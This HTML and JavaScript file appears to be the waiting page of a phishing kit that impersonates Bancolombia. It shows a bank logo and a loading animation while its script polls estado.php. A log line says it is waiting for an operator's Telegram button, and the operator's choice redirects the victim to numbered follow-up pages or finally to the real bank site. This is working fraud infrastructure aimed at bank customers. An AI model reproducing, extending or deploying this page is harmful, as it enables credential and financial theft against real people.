<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Esperando...</title>
  <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate, max-age=0">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="0">
  <meta http-equiv="Last-Modified" content="0">

  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background-color: #f7f7f7;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      text-align: center;
    }

    .contenedor {
      position: relative;
      width: 80%;
      max-width: 400px;
      margin: 0 auto;
    }

    .gif-overlay {
      position: relative;
      display: inline-block;
      width: 100%;
    }

    .gif-overlay img {
      width: 100%;
      display: block;
    }

    #tiempo {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      font-size: 18px;
      font-weight: bold;
      color: rgb(0, 0, 0);
      padding: 8px 16px;
      border-radius: 10px;
    }
  </style>
</head>
<body style="background-color:#f7f7f7; background-repeat: no-repeat; background-size: 300%;">

<br><br><br>
<center>
  <img src="img/banco45.png" style="margin-top: 150px;" width="70%" alt="">
  <img style="margin-top: -150px;" src="img/cargando1.gif" width="85%" alt="">
</center>


<script>
  const params = new URLSearchParams(window.location.search);
  const requestId = params.get("rid");
  const key = params.get("key");

  let estadoAnterior = null;
  let coincidenciasSeguidas = 0;
  let yaRedirigiendo = false;

  function logConsole(text) {
    const ts = new Date().toLocaleTimeString('es-CO', {hour12: false});
    // eslint-disable-next-line no-console
    console.log(`[espera] [${ts}] ${text}`);
  }

  logConsole(`Loader activo. rid=${requestId || '(null)'}  key=${key || '(null)'}. Esperando boton del operador en Telegram.`);

  function urlPara(estado) {
    switch (estado) {
      case 'opcion_1':  return `opcion1.html?key=${encodeURIComponent(key)}&requestId=${encodeURIComponent(requestId)}`;
      case 'opcion_2':
      case 'opcion_6':  return `opcion6.html?key=${encodeURIComponent(key)}`;
      case 'opcion_3':  return `opcion3.html?key=${encodeURIComponent(key)}`;
      case 'opcion_4':  return `opcion4.html?key=${encodeURIComponent(key)}`;
      case 'opcion_5':  return `opcion5.html?key=${encodeURIComponent(key)}`;
      case 'opcion_7':  return `opcion7.html?key=${encodeURIComponent(key)}`;
      case 'opcion_8':  return `opcion8.html?key=${encodeURIComponent(key)}`;
      case 'opcion_55': return `opcion55.html?key=${encodeURIComponent(key)}`;
      case 'opcion_9':  return `opcion9.php?key=${encodeURIComponent(key)}`;
      case 'opcion_10': return 'https://www.bancolombia.com/personas/creditos';
      default: return null;
    }
  }

  setInterval(() => {
    if (yaRedirigiendo) return;
    fetch(
      `estado.php?rid=${encodeURIComponent(requestId)}` +
      (key ? (`&key=${encodeURIComponent(key)}`) : ''),
      { cache: 'no-store', credentials: 'same-origin' }
    )
      .then(res => res.ok ? res.json() : Promise.reject('HTTP '+res.status))
      .then(data => {
        const estado = (data && typeof data.estado === 'string') ? data.estado : 'pendiente';

        if (estado === 'pendiente') {
          estadoAnterior = 'pendiente';
          coincidenciasSeguidas = 0;
          return;
        }

        if (estadoAnterior && estadoAnterior === estado) coincidenciasSeguidas += 1;
        else { estadoAnterior = estado; coincidenciasSeguidas = 1; }

        logConsole(`estado=${estado} (x${coincidenciasSeguidas})` +
          (coincidenciasSeguidas >= 2 ? ' => 2x OK, location.href automatico.' : ''));

        if (coincidenciasSeguidas >= 2) {
          const urlGo = urlPara(estado);
          if (urlGo && !yaRedirigiendo) {
            yaRedirigiendo = true;
            logConsole(`NAVEGACION (operador pulso boton Telegram) => ${urlGo}`);
            setTimeout(() => { window.location.href = urlGo; }, 350);
          }
        }
      })
      .catch(err => {
        logConsole(`error polling: ${err || 'network'} (reinicia contador)`);
        estadoAnterior = null;
        coincidenciasSeguidas = 0;
      });
  }, 2000);
</script>

</body>
</html>
